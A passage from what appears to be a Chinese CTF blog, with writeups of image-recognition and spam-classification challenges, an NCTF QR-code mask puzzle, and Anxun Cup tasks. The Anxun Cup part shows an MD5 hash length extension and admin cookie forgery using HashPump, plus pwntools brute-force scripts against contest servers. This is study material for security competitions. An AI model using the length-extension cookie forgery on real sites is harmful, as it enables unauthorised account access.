\n```\nfrom PIL import Image\nfrom pwn import *\nimport base64\nfrom itertools import product\n  \n  \np = remote('47.97.127.1',22398)\n  \n  \ndef getm(c,hash):\n    table = string.hexdigits[:-6]\n    for i in product(table,repeat=6):\n        a = c + ''.join(i)\n        if hashlib.md5(a.encode()).hexdigest() == hash:\n            return a\n  \n  \ndef step1():\n    p.recvuntil('plaintext:')\n    m = p.recv().decode().split('\\n')\n    m1 = m[0].strip().split('?')[0]\n    m2 = m[1].split('->')[1].strip()\n    a = getm(m1,m2)\n    print(a)\n    #p.recvuntil(\"What's is plaintext\")\n    p.sendline(a)\n    p.recvuntil('now, you get a png:')\n    content = ''\n    c = p.recv().decode()\n    while \"##The end\" not in c:\n        content += c\n        c = p.recv().decode()\n    content += c\n    content = content.split('##')[0].strip()\n    return content\n  \n  \ndef getdata():\n    content = step1()\n    print(content)\n    open('new.png','wb').write(base64.b64decode(content))\n    img = Image.open('new.png')\n    w,h = img.size\n    n = 0\n    for y in range(0,1000,50):\n        for x in range(0,1000,50):\n            n += 1\n            a = img.crop((x,y,50+x,50+y))\n            a.save(f\"img/{n}.png\")\ndef getflag():\n    getdata()\n    result = [0]*26\n    datas = [0]*26\n    for i in range(26):\n        name = str(i).zfill(2)\n        data = list(Image.open(f'zimubiao/{name}.png').getdata())\n        datas[i] = data\n  \n  \n    for i in range(1,401):\n        data = list(Image.open(f'img/{i}.png').getdata())\n        print(datas.index(data),f'{i}.png')\n        result[datas.index(data)] += 1\n    flag = ''\n    for i in result:\n        flag += str(i)+\",\"\n    flag = flag[:-1]\n    print(flag)\n    p.sendline(flag)\n    while 1:\n        print(p.recv())\n  \n  \ngetflag()\n  \n  \ndef getimage():\n    ls = []\n    a = {}\n    for i in range(1,401):\n        img = Image.open(f\"img/{i}.png\")\n        data = list(img.getdata())\n        a[i] = data\n  \n  \n    for i in a.values():\n        if i not in ls:\n            ls.append(i)\n    print(len(ls))\n  \n  \n    for k in ls:\n        for i in a.keys():\n            if a[i] == k:\n                print(f'img/{i}.png')\n                image = Image.open(f'img/{i}.png')\n                image.save(f'zimubiao/{i}.png')\n                break\n```\n  \n脚本的getimage()是将大图中不重样的小图保存到本地，图片的名称是我自己根据字母表改名的：\n  \n![](http://cdn.anyiblog.top/common/1671450461891-c07ef68c-7a8c-4d9a-85d8-72a03e9090d1.png)  \n运行得到flag\n\n![](http://cdn.anyiblog.top/common/1671450462875-0b3ba2ef-79dc-45ea-92db-7db30b0f636b.png)  \n  \n# 图片识别\n  \n下载附件得到题目源码\n  \n```\nimport os\nimport random\nimport base64\nimport time\nfrom PIL import Image, ImageDraw, ImageFont, ImageFilter\nimport io\nfrom secret import flag\nimport hashlib\n  \n  \nanimals = ['cat', 'pig', 'tigger', 'dog', 'cattle', 'mouse', 'bird', 'chicken', 'rabbit', 'koala', 'horse', 'deer', 'lion', 'elephant']\nnames = ['1.jpg','10.jpg','2.jpg','3.jpg','4.jpg','5.jpg','6.jpg','7.jpg','8.jpg','9.jpg']\n  \n  \ndef pow(hard_level = 6):\n    if hard_level >= 30:\n        hard_level = 30\n  \n  \n    m = hex(random.getrandbits(16 * 8))[2:]\n    c = hashlib.md5(m.encode()).hexdigest()\n    part = m[:32 - hard_level]\n    print(f'plaintext: {part}' + '?' * hard_level)\n    print(f'md5_hex -> {c}')\n    return part, c\n  \n  \ndef crack(part, c, level = 6):\n    s = int(part, 16) << (level * 4)\n    _limit = s + (1 << level * 4)\n    while s <= _limit:\n        s += 1\n        seed = hex(s)[2:].encode()\n        if hashlib.md5(seed).hexdigest() == c:\n            return seed\n  \n  \ndef game():\n    print(\"Easy pow:\")\n    pm, c = pow()\n    m = input(\"What's is plaintext?\\n> \")\n    if hashlib.md5(m.encode()).hexdigest() != c:\n        print('Failed')\n        return\n  \n  \n    _score = 0\n    for _ in range(10):\n        animal = random.choice(animals)\n        name = random.choice(names)\n        img = Image.open(f'/app/animal/{animal}/{name}')\n        img = img.rotate(random.randint(30, 170), expand = 1)\n        x, y = img.size\n        _rate = random.randint(-50, 10)\n        x, y = int(x + x * _rate / 100), int(y + y * _rate / 100)\n        img = img.resize((x, y), Image.ANTIALIAS)\n        content = io.BytesIO()\n        img.save(content, format='jpeg')\n        print(base64.b64encode(content.getvalue()).decode())\n        img.close()\n        content.close()\n        time.sleep(1)\n        _start = time.time()\n        _input = input(\"What's animal in this picture?\\n> \")\n        _end = time.time()\n  \n  \n        if _end - _start > 3:\n            print('timeouted')\n            return\n  \n  \n        if _input != animal:\n            print(f\"Oh, This is {animal}\")\n        else:\n            print(\"Yes, it's\")\n            _score += 1\n  \n  \n    if _score >= 8:\n        print(\"Great, you are good.\")\n        print(flag)\n    else:\n        print('Failed')\n  \n  \nif __name__ == '__main__':\n    game()\n```\n  \n与上题类似，同样是爆破MD5，不同的是这里将图片进行了一个旋转和改变大小的操作，要求我们通过变换后的图片识别出这是哪类动物，可以在题目附件文件夹中找到同样的图片。\n  \n这里刚开始的思路是想像上一道题一样通过还原找到原图，但是发现这次只给了我们3秒钟的时间\n  \n![](http://cdn.anyiblog.top/common/1671450463410-5fb8c091-3319-403c-b343-b8e1ac26071e.png)  \n但是我们如果要还原大小和旋转则需要爆破，这个过程是会超过3秒的。所以这一个思路pass掉了。\n  \n想起前几天rctf做的一道catspy，也是一道识别题，里面用到了模型识别的模块比较深刻。\n  \n```\ndef divide(img):\n  # Step 1: Initialize model with the best available weights\n  weights = ResNet50_Weights.DEFAULT\n  model = resnet50(weights=weights)\n  model.eval()\n  \n  \n  # Step 2: Initialize the inference transforms\n  preprocess = weights.transforms()\n  \n  \n  # Step 3: Apply inference preprocessing transforms\n  batch = preprocess(img).unsqueeze(0)\n  \n  \n  # Step 4: Use the model and print the predicted category\n  prediction = model(batch).squeeze(0).softmax(0)\n  class_id = prediction.argmax().item()\n  category_name = weights.meta[\"categories\"][class_id]\n  return category_name\n  \n  \n```\n  \n模型识别能识别图片进行分析是什么东西，也是需要训练。\n  \n刚开始用这个识别难免会与答案有些不符，但由于每次错误后题目会把正确答案提示出来，所以可以让识别的结果与答案做一个字典处理，然后每次识别后先看字典中是否存在这一识别结果 若有则发送答案。\n  \n所以我这道题就是识别+爆破做出来的，当时凑巧要出去做核酸就挂机运行这个脚本，回来的时候发现已经有flag了。\n  \n脚本：\n  \n```\nfrom torchvision.models import resnet50, ResNet50_Weights\nfrom PIL import Image\nfrom pwn import *\nimport base64\nfrom itertools import product\n  \n  \nanimals = ['cat', 'pig', 'tigger', 'dog', 'cattle', 'mouse', 'bird', 'chicken', 'rabbit', 'koala', 'horse', 'deer', 'lion', 'elephant']\ndc = {'tiger':'tigger','brambling':'bird','hamster':'mouse',\"Angora\":\"rabbit\",\"rhinoceros beetle\":\"horse\",\"koala\":\"koala\",\"Ibizan hound\":\"cattle\",\"tabby\":\"cat\",\"dhole\":\"deer\",'kuvasz':'dog','jacamar':\"bird\",\n'redbone':'horse','Border collie':'dog','Norfolk terrier':'mouse',\"muzzle\":\"elephant\",\"hog\":\"pig\",\"fox squirrel\":'cat','Sussex spaniel':'dog','clumber':'chicken','patas':\"deer\"}\n  \n  \ndef getm():\n    p.recvuntil('plaintext:')\n    m = p.recv().decode().split('\\n')\n    c = m[0].strip().split('?')[0]\n    hash = m[1].split('->')[1].strip()\n    table = string.hexdigits[:-6]\n    for i in product(table,repeat=6):\n        a = c + ''.join(i)\n        if hashlib.md5(a.encode()).hexdigest() == hash:\n            return a\n  \n  \ndef decode(name):\n    t1 = time.time()\n    content = ''\n    c = p.recvline().decode()\n    print(c)\n    n = 0\n    while \"What's animal in this picture\" not in c:\n        content += c\n        c = p.recvline().decode()\n        n += 1\n        print(n,c[:60])\n        if \"flag\" in c:\n            open('flag.txt','a').write(c)\n    content = content.strip().split('\\n')[-1]\n  \n  \n    f = open(name,'wb')\n    f.write(base64.b64decode(content))\n    t2 = time.time()\n    print(f'{name} 图片构写完毕 耗时 {t2-t1}s')\n  \n  \ndef divide(img):\n  # Step 1: Initialize model with the best available weights\n  weights = ResNet50_Weights.DEFAULT\n  model = resnet50(weights=weights)\n  model.eval()\n  \n  \n  # Step 2: Initialize the inference transforms\n  preprocess = weights.transforms()\n  \n  \n  # Step 3: Apply inference preprocessing transforms\n  batch = preprocess(img).unsqueeze(0)\n  \n  \n  # Step 4: Use the model and print the predicted category\n  prediction = model(batch).squeeze(0).softmax(0)\n  class_id = prediction.argmax().item()\n  category_name = weights.meta[\"categories\"][class_id]\n  return category_name\n  \ndef sickimg():\n    res = getm()\n    p.sendline(res)\n    for i in range(11):\n        t1 = time.time()\n        decode(f\"{i}.jpeg\")\n        img = Image.open(f\"{i}.jpeg\")\n        category_name = divide(img)\n        print('模型结果：%s'%category_name)\n        a = 0\n        if category_name in dc.keys():\n            for i in dc.keys():\n                if category_name == i:\n                    a = 1\n                    print(f'1 发送{dc[i]}')\n                    p.sendline(dc[i])\n                    break\n        else:\n            for i in animals:\n                if i in category_name:\n                    print(f'2 发送{i}')\n                    a = 1\n                    p.sendline(i)\n                    break\n        if a != 1:\n            print(f'3 发送mouse')\n            p.sendline('mouse')\n        t2 = time.time()\n        print(\"time\",t2-t1)\n  \n  \nfor i in range(1000):  \n    p = remote('47.97.127.1',29335)\n    try:\n        sickimg()\n        p.close()\n    except:\n        pass\n    sleep(3)\n\n```\n\n![](http://cdn.anyiblog.top/common/1671450463932-3d0ea718-9b70-4a62-ba54-b2e267d96a65.png)  \n\n\n# 垃圾邮件分析\n  \n这道题没有附件，直接远程连接题目。\n  \n![](http://cdn.anyiblog.top/common/1671450465628-24091caa-f1af-47cb-bde9-553612134588.png)  \n爆破sha256，脚本：\n  \n```\nimport string\nfrom itertools import product\nimport hashlib\n  \n  \nm1 = 'u8tkfHbguwjvbuf5pdYVbhknh9Y9'\nm2 = 'ca7a86b1d4d914dd78c5f434b173b8ec8d51cfc71ede5ae1be5b47e54e121cf8'\ntable = string.ascii_letters + string.digits\nprint(table)\nfor i in product(table,repeat=4):\n    a = m1 + ''.join(i)\n    if hashlib.sha256(a.encode()).hexdigest() == m2:\n        print(a,''.join(i))\n        break\n```\n  \n![](http://cdn.anyiblog.top/common/1671450466174-dd870f31-e17d-4a54-a8cc-ae8dabfa68dc.png)  \n发送后触发游戏规则\n  \n![](http://cdn.anyiblog.top/common/1671450466634-12e2f99f-82ee-4267-a454-85058472f58b.png)  \n  \n题目大致意思就是会给你50个样本模型，让你的AI去训练，最后会给你10个样品让你的AI去验证是否为垃圾邮件\n  \n由于这题没设置答题时间，让人来识别也是能识别出来的。\n  \n我这边是用chatGPT来识别，每道题基本上能分析出正确答案，YYDS。\n  \n![](http://cdn.anyiblog.top/common/1671450467858-f4e33b66-0c2f-4429-8550-b08056019b06.png)  \n最后答对10题即可获得flag（补一张题目bug的图片）\n  \n![](http://cdn.anyiblog.top/common/1671450628331-f465cb81-cfcf-4589-a482-daed5fdb18a1.png)","tags":["CTF","干货"],"categories":["刷题笔记","Writeup"]},{"title":"NCTF 杂项qrssssssss 专栏","url":"/2022/12/05/20221205/","content":"# 前言\n  \n  \nNCTF告一段落了，战况还可以。\n  \n![](http://cdn.anyiblog.top/common/1670243860208-f4a8b648-8ce9-4ae4-b389-315af533773f.png)  \n有趣的是看到最终名单有自己，我寻思自己这么低的分数也能被记录上，细看才发现是校内名单。信息搞错了，还真高兴的那么几秒。\n  \n![](http://cdn.anyiblog.top/common/1670243861097-5c22e8d3-0921-443f-87c7-b8a318db7ea4.png)  \n在比赛结束前20分钟最后做出来qrssssssss这题！所以特此来记录下misc的qrssssssss和qrssssssss\\_revenge这两题做题的过程\n  \n# qrssssssss\\_revenge\n  \n（第一道题有非预期解，可以通过 按时间先后顺序 进行排序 逐个扫描再重复尝试能得到flag，所以这里以第二道题qrssssssss\\_revenge为例）\n  \n下载附件压缩包解压得到一堆二维码图片\n  \n![](http://cdn.anyiblog.top/common/1670243862428-c5725bcc-c414-4db6-8f6b-fdd9e04e46cf.png)  \n看到这么多二维码第一眼反应就是用pyzbar库批量扫描，所以先尝试批量扫描看看什么东西\n  \nos批量处理图片名，然后再用pyzbar库扫描 提取二维码内容。\n  \n```\nfrom pyzbar import pyzbar\nfrom PIL import Image\nimport cv2\nimport os\n  \nPATH = './qrssssssss_revenge'\n  \nos.chdir(PATH)\n  \ntext = ''\nfor i in os.listdir():\n    qrcode = cv2.imread(i)\n    data = pyzbar.decode(qrcode)\n    text += data[0].data.decode('utf-8')\n  \nprint(text)\n```\n  \n```\n303bdc03bc3e3d84bdd2{4}}T84f7dfb3Tf86Ff67fe30e07d6N3f3C{479dc8eebbde3df2F6d6e3322bdNef34T81db6fF66e7{1}F3eb49f108Cd30646f{f049dc}4T3363Fd32F4bbb3N234CCd09c8Te6ee86bN4T1dTe}323bd367Fd9f2ddf4f4b4d9cTCf{b}3F244b2dd60CcT3242{74d3db26e{b0be}fb}9b116C{3T}9F49T}e3324db42b03eb46eN62Nbb0T684443706bfe202318CN66NCee24c{89e74ef428FCb491d}4dc{eb2{7cF13Fb4dcNT3673ef26fd6Cdbd37e9N33NdfcNc12Tcbf4418Cd14bdef34TC}939}b4{1ffddc{0ff13}ddddb49}8F394N{24bb72}b7Fdb2db4fb{63T43dCN346f1e383c66dF7eb6e42b{4b21d4N222C70N8beb244df6fCFb\n```\n  \n得到的结果是乱的，但能发现N C T F { 这些flag的关键字符，说明flag的搞到但是顺序是错乱的。\n  \n后面尝试词频分析，但也不是，每个字符都是均匀的分布。\n  \n问了出题人，得知我们并不需要处理扫描后的字符串，我们需要处理扫描图片的一个顺序。正确的顺序能直接扫描得到flag\n  \n同时题目给出了提示：\n  \n![](http://cdn.anyiblog.top/common/1670243862832-ac51bf3d-d281-47b0-a62f-016ed0afcfda.png)  \nLMQH 代表的是二维码的纠错级别，所以这里猜测我们还要去分析每张二维码的纠错级别，将同一类别的二维码放到一起 然后再进行处理。\n  \n至于如何去分析，我参考了网上的文章关于二维码的构造，参考：[http://www.2wm.cn/article/article-12](http://www.2wm.cn/article/article-12)\n  \n![](http://cdn.anyiblog.top/common/1670243863270-825ce9e2-5df7-445f-b993-b3feb39cd09c.png)  \n我们能够观察红色区域的4个方块的黑白情况来分析纠错级别。\n  \n**level L：1、2都为黑色\nlevel M：1为黑色，2为白色\nlevel Q：1为白色，2为黑色\nlevel H：1、2都为白色**\n  \n所以这里思路就有了，因为每张图片的大小都是一样，所以可以用PIL模块提取每张图片的红色区域的坐标对应的颜色，再添加到列表里。\n再与我们先定义好的每个纠错级别的列表进行比较，如果一样就能确定纠错级别，最后把同一级别的列表的二维码逐一扫描识别 打印结果。\n  \n二维码中每个方块的大小是20px，所以这里用脚本定义了下，红色区域的坐标也通过方块的数量来找。\n  \n```\nfrom pyzbar import pyzbar\nfrom PIL import Image\nimport cv2\nimport os\n  \n  \nPATH = './qrssssssss_revenge'\n  \n  \nblock_size = 20\nwidth,height = 660,660\n  \n  \ndef Errorlevel(images): #获取纠错级别\n    level_list = ['1111','1010','0101','0000'] #L M Q H\n    L,M,Q,H = [],[],[],[]\n    for img in images:\n        level = ''\n        m = Image.open(img)  \n        h = block_size * 8 + block_size // 2 # + block_size //2 是为了找方块中心区域识别\n        for i in range(0,block_size*2,block_size):\n            w = i + block_size//2\n            rgb = m.getpixel((w,h))\n            if rgb == 255:\n                level += \"0\"\n            else:\n                level += \"1\"\n        w = block_size * 8 + block_size // 2\n        for i in range(0,block_size*2,block_size):\n            h = height - (i + block_size//2)\n            rgb = m.getpixel((w,h))\n            if rgb == 255:\n                level += \"0\"\n            else:\n                level += \"1\"\n        if level in level_list:\n            eval('LMQH'[level_list.index(level)]).append(img)\n    return [L,M,Q,H]\n  \n  \nos.chdir(PATH)\n  \n  \nimage_names = []\ntext = ''\nfor i in os.listdir():\n    image_names.append(i)\n  \n  \nfor level in Errorlevel(image_names):\n    text = ''\n    for img in level:\n        qrcode = cv2.imread(img)\n        data = pyzbar.decode(qrcode)\n        text += data[0].data.decode('utf-8')\n    print(text)\n```\n  \n运行结果\n  \n```\n2{TT6FNC{F62NT16F{1F1C6{T6F2FN2CCT6NT1TFTC{F2CT2{2{116C{TFT22N6NT6621CN66NC{2FC1{2{F1FNT666CNNN12T1C1TC{1{1FN{2F2{TCN16F{1N2CNCF\n0d03e3d8d8f73870073f378ee3de38dfe73f08d300d33d3d08ee83d37dfff3037d30ef3330ee08370fe08e8e7ef87373f733ff8e3f0f3ddd837733d3837e708f\n33b34b44b63649bb32632b466b4946494334bbb3496b432b692b49b24464246bb9b9494b436242324944b49b3239b44399b4b9944bb2bb6366b6424b222bb26b\ncbcd}}dffffeeddcdedfdefb}effc}cede}dfd44dc}bddcdbeb}}}}edbb4bb44becd}4dcecb4dcefddbdedccc4dbdf4}}fddcf}d4}}dbd4fb44fecdebd4e44df\n```\n  \n能发现运行结果中，虽然顺序还是乱的 但是看第一行都包含了 N C T F { 那就说明这个思路没错，每一个列表都有flag的一部分 但列表内还是乱的。\n  \n比赛时做到这里就蒙了，再次询问出题人寻求帮助，发现其实还疏忽了一个东西：掩码\n  \n参考文章：[https://www.bilibili.com/read/cv13270189](https://www.bilibili.com/read/cv13270189)\n  \n![](http://cdn.anyiblog.top/common/1670243863713-fbc288a0-9e18-44c6-9179-ef619cfc11ac.png)  \n掩码和纠错级别它们被记录在二维码的格式信息中。\n  \n所以我们还需按照掩码的编号进行排先后顺序，这样就能搞定顺序问题，从而得到flag。\n  \n为了验证，我们可以根据上面的脚本 将纠错级别为L的图片名打印出来，然后找出来扫描内容为N的图片，通过扫描工具查看其掩码是否为0（0为掩码0-7中的起始）\n  \n![](http://cdn.anyiblog.top/common/1670243864158-dd9f2604-74af-4523-ba25-623aea997891.png)  \n同样可以扫描内容为C的二维码，其掩码是1。那就说明我们思路没错，现在只需获取掩码进行排序就能解决当前的问题。\n  \n**如何获取原二维码的掩码？？**\n  \n网上大多的资料是告诉我们如何将可读的二维码通过掩码转换成我们看到的二维码，而我们得到的是处理过后的二维码。\n  \n可以参考这个视频，关于掩码讲的很清晰：[https://www.huxiu.com/article/398385.html](https://www.huxiu.com/article/398385.html)\n  \n![](http://cdn.anyiblog.top/common/1670243865148-a24c8060-46a3-4ba9-a49d-2b5deffb4f87.png)  \n拿上面的二维码做例子\n  \n首先，我们得到一个二维码 可以看其左上角码头下方的5个数据块得到信息\n  \n![](http://cdn.anyiblog.top/common/1670243865532-dee8451e-1b2d-40f3-87d1-90ae5008af14.png)  \n能看出其纠错级别为L，掩码是101，因为经过处理 所以这里的掩码是不准确的。\n  \n按视频中所讲，我们只需11101与10101异或，异或得到的数据即为原二维码的掩码。（这里拿101和101异或也可以）\n  \n异或后的结果**0b11101 ^ 0b10101 = 01000**，得到掩码为000 转换十进制是0也就是掩码0\n  \n符合扫描结果。\n  \n因此现在的思路就是通过识别每张二维码的掩码（三位块数据），再与101进行异或，就能得到得到原掩码，最后对掩码进行排序就能得到正确顺序的flag\n  \n脚本同样是用PIL识别三位块的颜色 黑白转换数据（二维码中黑代表1，白代表0），然后通过异或计算得到掩码，将掩码作为列表的下标把内容添加到一个长度为8的列表中，最后拼接列表内容 返回一个纠错级别的内容。循环纠错级别 拼接内容 得到flag\n  \n```\nfrom PIL import Image\nfrom pyzbar import pyzbar\nimport os\nimport cv2\n  \n  \n  \n  \nPATH = './qrssssssss_revenge' #_revenge\n  \n  \nblock_size = 20\nwidth,height = 660,660\n  \n  \ndef Mask(image): #获取二维码的掩码\n    res = ['']*8\n    for k in image:\n        img = Image.open(k)\n        qrcode = cv2.imread(k)\n        data = pyzbar.decode(qrcode)\n        text = data[0].data.decode('utf-8')\n        mask = ''\n        h = block_size * 8 + block_size // 2\n        for i in range(0,block_size*3,block_size):\n            w = block_size * 2 + i + block_size//2\n            rgb = img.getpixel((w,h))\n            if rgb == 255:\n                mask += \"0\"\n            else:\n                mask += \"1\"\n        #得到的二进制数据 与 101 异或得到原掩码\n        mask_ = int(mask,2) ^ 0b101\n        res[mask_] = text\n        result = ''.join(res)\n        print(k,mask,text)\n    return result\n  \n  \ndef Errorlevel(images): #获取纠错级别\n    level_list = ['1111','1010','0101','0000'] #L M Q H\n    L,M,Q,H = [],[],[],[]\n    for img in images:\n        level = ''\n        m = Image.open(img)  \n        h = block_size * 8 + block_size // 2\n        for i in range(0,block_size*2,block_size):\n            w = i + block_size//2\n            rgb = m.getpixel((w,h))\n            if rgb == 255:\n                level += \"0\"\n            else:\n                level += \"1\"\n        w = block_size * 8 + block_size // 2\n        for i in range(0,block_size*2,block_size):\n            h = height - (i + block_size//2)\n            rgb = m.getpixel((w,h))\n            if rgb == 255:\n                level += \"0\"\n            else:\n                level += \"1\"\n        if level in level_list:\n            eval('LMQH'[level_list.index(level)]).append(img)\n    return [L,M,Q,H]\n  \n  \ndef main(image_names):\n    images = Errorlevel(image_names) #创建同一纠错列表\n    flag = ''\n    for n in images:\n        flag += Mask(n) #按照掩码排序\n    print(f'[+] {flag}')\n  \n  \nos.chdir(PATH)\n  \n  \nimage_names = []\nfor i in os.listdir():\n    image_names.append(i)\n  \n  \nmain(image_names)\n```\n  \n运行得到FLAG\n  \n![](http://cdn.anyiblog.top/common/1670243865940-c4ee9cb5-182c-47f7-891e-e746857e47f0.png)  \nqrssssssss：\n  \n![](http://cdn.anyiblog.top/common/1670243866360-9ce8e747-3876-4721-96ed-8c8e8da6096b.png)  \n# 总结\n  \n学到了二维码的纠错级别和掩码的内容，以及还原掩码的方式。这些也只是二维码的冰山一角，这一块还需慢慢探索。","tags":["CTF","干货"],"categories":["刷题笔记","Writeup"]},{"title":"安洵杯writeup | 越努力,越幸运","url":"/2022/11/28/20221128/","content":"\n# 前言\n  \n一个人打太难了！不过成绩还算比较满意吧。可惜是距离线下就差那么一道题\n  \n![](http://cdn.anyiblog.top/common/1669638566046-64310e32-d229-4cd9-83fc-11e32202c330.png)  \n![](http://cdn.anyiblog.top/common/1669638568477-ced4a6f7-df70-4c0d-aadf-702a9549b2c2.png)  \n  \n# Web\n  \n### EZ\\_JS\n  \nhash扩展攻击+Cookie伪造\n  \n![](http://cdn.anyiblog.top/common/1669638572526-d96e6ea3-b2b1-4777-90f7-59e9e11d31c5.png)  \n打开容器，是一个登录界面，随便登录之后会跳转到/cookie页面，这是关键的地方。\n  \n先看首页源码，有一段提示。\n  \n![](http://cdn.anyiblog.top/common/1669638573467-4ef6310e-570a-48dd-990b-1cd81f4c4360.png)  \n有两个信息：一是secret长度为7，告诉了我们的hash值（也就是/cookie页面下的cookie的hash值），二是admin的cookie如何构造\n  \n因此我们先尝试用admin登录，但发现页面的回显还是一样，查看/cookie页面的源代码 发现注释\n  \n![](http://cdn.anyiblog.top/common/1669638574273-dc52e799-d9ad-4464-aa36-df8de082684c.png)  \njsfuck编码，复制到console控制台运行\n  \n![](http://cdn.anyiblog.top/common/1669638575518-52c7a16e-5e07-4f14-9213-4e2a5fcb4fe6.png)  \n提示了admin要大写，这里吐槽下是要Admin，不是ADMIN 首字母大写，尝试了很久。。\n  \n再次登录发现回显不一样了。\n  \n![](http://cdn.anyiblog.top/common/1669638576171-151fffc2-6409-41ec-a926-b6b071c44f6f.png)  \n现在就需要我们构造admin的cookie了，重点来了。\n  \n可以参考文章[https://blog.csdn.net/destiny1507/article/details/100543233](https://blog.csdn.net/destiny1507/article/details/100543233)\n  \n这里要下一个工具hashpump，可以方便我们快速构造hash\n  \n```\ngit clone https://github.com/bwall/HashPump\napt-get install g++ libssl-dev\ncd HashPump\nmake\nmake install\n```\n然后将题目给我们的hash值填进去，题目还告诉我们secret长度为7，所以这里key length为7\n  \n剩下的input data 和 input data to add 要看那个urldecode的部分：\n  \n![](http://cdn.anyiblog.top/common/1669638576777-35fdc270-0fda-44d3-b1e7-79f6ccd4724f.png)  \n分别是flag和dog（这里input data可以随便填的）\n  \n  \n![](http://cdn.anyiblog.top/common/1669638577642-86080fc9-14d8-47d9-a202-48b8d3d0515f.png)  \n```\ned63246fb602056fee4a7ec886d0a3c2\nflag\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00X\\x00\\x00\\x00\\x00\\x00\\x00\\x00dog\n```\n  \n运行之后得到hash值和byte数据，这里byte数据可以跟题目的那一部分对比 是完全一样的。\n  \n这里的hash值就是admin cookie了，现在我们只需伪造cookie，将原hash替换成admin cookie即可。\n  \n![](http://cdn.anyiblog.top/common/1669638579373-7fe18735-b5ea-49b8-936e-c9e1a29c3dea.png)  \n登录得到flag\n  \n![](http://cdn.anyiblog.top/common/1669638580192-b243c9d9-bfa4-4594-b821-74b5fb9611a5.png)  \nD0g3{Ez\\_js\\_is\\_here}\n  \n# MISC\n  \n### GumpKing\n  \n一个小游戏，积分玩到100就有flag，这边用CE改速度速通\n  \n![](http://cdn.anyiblog.top/common/1669638588710-a5a15425-03eb-4439-8a82-8c27bac056a8.png)  \nD0g3{1145141919810}\n  \n  \n### little\\_thief\n  \n流量分析题，wireshark打开。\n  \nhttp流量，选择导出http对象。\n  \n![](http://cdn.anyiblog.top/common/1669638598047-fd2086e3-e852-49f1-8969-1b1b342d279b.png)  \n关键文件有一个secret.zip，但需要密码\n  \n![](http://cdn.anyiblog.top/common/1669638599309-844543a6-ce09-457f-8988-817d84643b01.png)  \n里面是flag.html看起来是重要文件，所以目前要找到密码。密码从流量里找，所以先从http流量分析看起\n  \n```\nhttp.response.code==200 #筛选状态码正常的流量\n```\n  \n利用筛选语句找到符合的流量，然后找结果中长度较大的流量包\n![](http://cdn.anyiblog.top/common/1669638602243-be26a1ab-2051-4089-9de9-cde718dbf26d.png)  \n通过追踪，在/api/login.php流量中发现了一段base64数据\n  \n![](http://cdn.anyiblog.top/common/1669638603665-d29ee94c-2171-4529-813a-d4a339278a2b.png)  \n解密得到了压缩包的密码\n  \n![](http://cdn.anyiblog.top/common/1669638605020-35fff228-2f17-4ce7-baa8-facc1cb473a8.png)  \n```\n\"rootPassword\":\"s1r_Th1s_k3y\"\n```\n  \n拿去解密压缩包成功解压，得到flag.html\n  \n打开网页，发现是一段废话生成器大量文字，包含着flag字段\n  \n![](http://cdn.anyiblog.top/common/1669638606914-2a39c8b5-9717-4b21-ba75-bba87ee4cf47.png)  \n像这种大量数据的，就猜测snow隐写，或者wbstego，其特征就是文件会有大量的20 和 09 hex数据\n  \nwinhex分析，确实是这样的。\n  \n![](http://cdn.anyiblog.top/common/1669638608019-079e6294-203f-43e0-a71a-acc75cf55831.png)  \n这里尝试snow隐写解密无果，所以这里不是snow隐写\n  \n最后尝试wbStego解密，成功得到flag\n  \n![](http://cdn.anyiblog.top/common/1669638608701-57e3c069-eb32-4868-b44c-9f6de65fb1b4.png)  \nD0g3{H@ppY\\_sh@rdlng3pheRe}\n  \n# Crypto\n  \n### Cry1\n  \n![](http://cdn.anyiblog.top/common/1669638609421-b4be1460-6e6e-4439-b9f0-80b57d710392.png)  \nnc访问靶机，给了一个sha256的哈希值，然后和一部分已知明文。\n  \n让我们去得到未知的部分，那么很明显只需要爆破字母表去找4个未知部分，写脚本：\n  \n```\nfrom pwn import *\nimport string\nimport hashlib\n  \n  \ndef getxxxx(know,cipher):\n    table = string.ascii_letters+string.digits\n    for a in table:\n        for b in table:\n            for c in table:\n                for d in table:\n                    cip = a+b+c+d\n                    cip_hash = hashlib.sha256((cip+know).encode()).hexdigest()\n                    if cip_hash == cipher:\n                        print(cip,cip_hash)\n                        return cip\nif __name__ == '__main__':\n    p = remote('120.78.131.38',10001)\n    content = p.recv().decode()\n    cipher = content.split(':')[1].strip()\n    know = content.split(')')[0].split('+')[1].strip()\n    cip = getxxxx(know,cipher)\n    p.sendlineafter('Give Me XXXX:\\n',cip)\n    print(p.recv())\n```\n  \n运行脚本，发现发送后回显的内容让我们猜数字\n  \n![](http://cdn.anyiblog.top/common/1669638610230-ca9c635c-ac2e-4ca5-b8bf-299ec18ca570.png)  \n有6次机会，数字在1-20，这里的思路就是脚本尝试1-6，然后循环整体操作多次直到猜测成功为止。\n  \n继续完善脚本：\n```\nfrom pwn import *\nimport string\nimport hashlib\n  \n  \ndef getxxxx(know,cipher):\n    table = string.ascii_letters+string.digits\n    for a in table:\n        for b in table:\n            for c in table:\n                for d in table:\n                    cip = a+b+c+d\n                    cip_hash = hashlib.sha256((cip+know).encode()).hexdigest()\n                    if cip_hash == cipher:\n                        print(cip,cip_hash)\n                        return cip\nif __name__ == '__main__':\n    for i in range(3):\n        p = remote('120.78.131.38',10001)\n        content = p.recv().decode()\n        cipher = content.split(':')[1].strip()\n        know = content.split(')')[0].split('+')[1].strip()\n        cip = getxxxx(know,cipher)\n        p.sendlineafter('Give Me XXXX:\\n',cip)\n        p.sendlineafter(\"If you guessed right, I'll give you the flag!, You only have 6 chances (1~20)\\n\",'1')\n        for i in range(2,7):\n            content = p.recv().decode()\n            if \"wrong\" not in content:\n                print(content)\n                break\n            p.sendline(str(i))\n        if \"D0g3\" in content:\n            break\n        p.close()\n```\n  \n  \n![](http://cdn.anyiblog.top/common/1669638610997-6b2f67c0-cd01-4036-8af7-5215a0889897.png)  \nD0g3{Y0u\\_C4n\\_gu3ss\\_The\\_Fl4g}\n  \n# Reverse\n  \n### reee\n  \n32位程序，IDA分析。\n  \nmain函数：\n  \n![](http://cdn.anyiblog.top/common/1669638612334-4a870f7c-d4a6-4c44-abf5-4cbb150a67b0.png)  \n主函数是sub\\_401640，我们跟进过去\n  